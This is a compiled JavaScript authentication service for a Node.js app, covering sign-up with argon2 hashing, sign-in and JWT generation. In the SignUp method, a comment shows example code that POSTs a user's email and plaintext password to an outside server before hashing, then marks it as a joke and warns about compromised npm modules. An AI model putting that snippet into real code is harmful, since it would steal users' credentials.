"use strict";
var __assign = (this && this.__assign) || function () {
    __assign = Object.assign || function(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p))
                t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
var typedi_1 = require("typedi");
var jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
var mailer_1 = __importDefault(require("./mailer"));
var config_1 = __importDefault(require("../config"));
var argon2_1 = __importDefault(require("argon2"));
var crypto_1 = require("crypto");
var eventDispatcher_1 = require("../decorators/eventDispatcher");
var events_1 = __importDefault(require("../subscribers/events"));
var AuthService = /** @class */ (function () {
    function AuthService(userModel, 
    // : Models.UserModel,
    mailer, logger, eventDispatcher) {
        this.userModel = userModel;
        this.mailer = mailer;
        this.logger = logger;
        this.eventDispatcher = eventDispatcher;
    }
    AuthService.prototype.SignUp = function (userInputDTO) {
        return __awaiter(this, void 0, void 0, function () {
            var salt, hashedPassword, userRecord, token, user, e_1;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        _a.trys.push([0, 4, , 5]);
                        salt = crypto_1.randomBytes(32);
                        /**
                         * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
                         * require('http')
                         *  .request({
                         *     hostname: 'http://my-other-api.com/',
                         *     path: '/store-credentials',
                         *     port: 80,
                         *     method: 'POST',
                         * }, ()=>{}).write(JSON.stringify({ email, password })).end();
                         *
                         * Just kidding, don't do that!!!
                         *
                         * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
                         * watches every API call and if it spots a 'password' and 'email' property then
                         * it decides to steal them!? Would you even notice that? I wouldn't :/
                         */
                        this.logger.silly("Hashing password");
                        return [4 /*yield*/, argon2_1.default.hash(userInputDTO.password, { salt: salt })];
                    case 1:
                        hashedPassword = _a.sent();
                        this.logger.silly("Creating user db record");
                        return [4 /*yield*/, this.userModel.create(__assign(__assign({}, userInputDTO), { salt: salt.toString("hex"), password: hashedPassword }))];
                    case 2:
                        userRecord = _a.sent();
                        this.logger.silly("Generating JWT");
                        token = this.generateToken(userRecord);
                        if (!userRecord) {
                            throw new Error("User cannot be created");
                        }
                        this.logger.silly("Sending welcome email");
                        return [4 /*yield*/, this.mailer.SendWelcomeEmail(userRecord)];
                    case 3:
                        _a.sent();
                        this.eventDispatcher.dispatch(events_1.default.user.signUp, { user: userRecord });
                        user = userRecord.toObject();
                        Reflect.deleteProperty(user, "password");
                        Reflect.deleteProperty(user, "salt");
                        return [2 /*return*/, { user: user, token: token }];
                    case 4:
                        e_1 = _a.sent();
                        this.logger.error(e_1);
                        throw e_1;
                    case 5: return [2 /*return*/];
                }
            });
        });
    };
    AuthService.prototype.SignIn = function (email, password) {
        return __awaiter(this, void 0, void 0, function () {
            var userRecord, validPassword, token, user;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: return [4 /*yield*/, this.userModel.findOne({ email: email })];
                    case 1:
                        userRecord = _a.sent();
                        if (!userRecord) {
                            throw new Error("User not registered");
                        }
                        /**
                         * We use verify from argon2 to prevent 'timing based' attacks
                         */
                        this.logger.silly("Checking password");
                        return [4 /*yield*/, argon2_1.default.verify(userRecord.password, password)];
                    case 2:
                        validPassword = _a.sent();
                        if (validPassword) {
                            this.logger.silly("Password is valid!");
                            this.logger.silly("Generating JWT");
                            token = this.generateToken(userRecord);
                            user = userRecord.toObject();
                            Reflect.deleteProperty(user, "password");
                            Reflect.deleteProperty(user, "salt");
                            /**
                             * Easy as pie, you don't need passport.js anymore :)
                             */
                            return [2 /*return*/, { user: user, token: token }];
                        }
                        else {
                            throw new Error("Invalid Password");
                        }
                        return [2 /*return*/];
                }
            });
        });
    };
    AuthService.prototype.generateToken = function (user) {
        var today = new Date();
        var exp = new Date(today);
        exp.setDate(today.getDate() + 60);
        /**
         * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
         * The cool thing is that you can add custom properties a.k.a metadata
         * Here we are adding the userId, role and name
         * Beware that the metadata is public and can be decoded without _the secret_
         * but the client cannot craft a JWT to fake a userId
         * because it doesn't have _the secret_ to sign it
         * more information here: https://softwareontheroad.com/you-dont-need-passport
         */
        this.logger.silly("Sign JWT for userId: " + user._id);
        return jsonwebtoken_1.default.sign({
            _id: user._id,
            role: user.role,
            name: user.name,
            exp: exp.getTime() / 1000,
        }, config_1.default.jwtSecret);
    };
    AuthService = __decorate([
        typedi_1.Service(),
        __param(0, typedi_1.Inject("userModel")),
        __param(2, typedi_1.Inject("logger")),
        __param(3, eventDispatcher_1.EventDispatcher()),
        __metadata("design:paramtypes", [Object, mailer_1.default, Object, eventDispatcher_1.EventDispatcherInterface])
    ], AuthService);
    return AuthService;
}());
exports.default = AuthService;
//# sourceMappingURL=auth.js.map